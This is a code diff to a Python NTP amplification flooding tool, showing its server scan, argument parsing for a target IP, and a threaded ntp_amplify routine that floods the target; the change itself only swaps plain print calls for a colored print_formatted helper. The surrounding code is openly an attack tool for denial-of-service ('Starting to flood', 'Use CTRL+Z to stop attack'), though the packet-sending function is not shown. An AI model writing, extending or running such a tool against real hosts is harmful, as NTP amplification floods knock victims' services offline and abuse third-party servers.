@@ -68,14 +68,14 @@ class NTPScanner:
         self.servers = []
 
     def restart_daemon(self):
-        print("Restarting ntp daemon...")
+        print_formatted("+", "Restarting ntp daemon...")
         subprocess.run(["systemctl", "restart", "ntp"])
-        print("Synchronizing ntp servers...")
+        print_formatted("+", "Synchronizing ntp servers...")
         time.sleep(2 * self.config.server_count)
 
     def scan(self):
         self.servers.clear()
-        print("Scanning for ntp servers...")
+        print_formatted("+", "Scanning for ntp servers...")
         output = subprocess.run(["ntpq", "-p"], capture_output=True).stdout.decode()
         for line in output.split("\n"):
             refid = self.extract_ipv4_refid(line)
@@ -152,7 +152,7 @@ def parse_args():
                 sys.exit(0)
             if arg == "-s":
                 if i + 1 >= len(sys.argv):
-                    print("Error: server list file is required")
+                    print_formatted("-", "Error: server list file is required")
                     print_banner()
                     sys.exit(1)
                 args["server_list"] = sys.argv[i + 1]
@@ -160,7 +160,7 @@ def parse_args():
 
     args["target_ip"] = sys.argv[-1]
     if args["target_ip"] is None or not is_ipv4(args["target_ip"]):
-        print("Target ip is required and must be a valid ipv4 address")
+        print_formatted("-", "Target ip is required and must be a valid ipv4 address")
         print_banner()
         sys.exit(1)
 
@@ -181,8 +181,8 @@ def read_servers(server_list: str) -> list:
 def ntp_amplify(servers: list, target: str):
     threads = []
     try:
-        print("Starting to flood: " + target + " ...")
-        print("Use CTRL+Z to stop attack")
+        print_formatted("+", "Starting to flood: " + target + " ...")
+        print_formatted("!", "Use CTRL+Z to stop attack")
 
         for server in servers:
             thread = threading.Thread(target=deny, args=(server, target))
@@ -190,13 +190,29 @@ def ntp_amplify(servers: list, target: str):
             thread.start()
             threads.append(thread)
 
-        print("Flooding...")
+        print_formatted("+", "Flooding...")
 
         while True:
             time.sleep(1)
 
     except KeyboardInterrupt:
-        print("Script interrupted [CTRL + Z]... shutting down")
+        print_formatted("-", "Script interrupted [CTRL + Z]... shutting down")
+
+
+def print_formatted(prefix: str, text: str, color: str = "red", attrs: list = []):
+    valid_prefixes = ["+", "!", "-"]
+
+    if prefix not in valid_prefixes:
+        raise ValueError("Invalid prefix: " + prefix)
+
+    colored_prefix = {
+        "+": colored(prefix, "green", attrs=["bold"]),
+        "!": colored(prefix, "yellow", attrs=["bold"]),
+        "-": colored(prefix, "red", attrs=["bold"]),
+    }
+
+    colored_text = colored(text, color, attrs=attrs)
+    print("[" + colored_prefix[prefix] + "]" + " " + colored_text)
 
 
 def main():
